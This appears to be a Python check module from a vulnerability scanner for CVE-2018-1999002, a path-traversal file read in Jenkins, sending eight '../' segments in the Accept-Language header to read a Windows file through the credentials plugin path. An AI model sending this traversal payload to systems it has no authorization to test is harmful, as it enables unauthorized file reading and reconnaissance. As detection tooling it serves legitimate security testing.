#!/usr/bin/python3

from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2018_1999002_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2018-1999002漏洞',
            'description': 'CVE-2018-1999002漏洞可任意读取文件,在Linux条件下利用比较困难,则需要一个带有_的目录才能利用,可用来用户名枚举,受影响版本: Jenkins < 2.132, the Stapler web framework < 2.121.1',
            'date': '2018-07-23',
            'exptype': 'check',
            'type': 'File Read'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.file_name = "windows/win"
        self.BACKDIR_COUNT = 8
        self.header = {
            "User-Agent": get_useragent(),
            'Accept-Language': ('../' * self.BACKDIR_COUNT) + self.file_name
        }

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_url =  self.url + '/plugin/credentials/.ini'
            check_req = await request.get(check_url, headers = self.header)
            if "MPEGVideo" in await check_req.text() and check_req.status == 200:
                # print('存在CVE-2018-1999002漏洞')
                return True
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2018_1999002 = CVE_2018_1999002_BaseVerify('http://10.4.69.55:8789')
    CVE_2018_1999002.check()



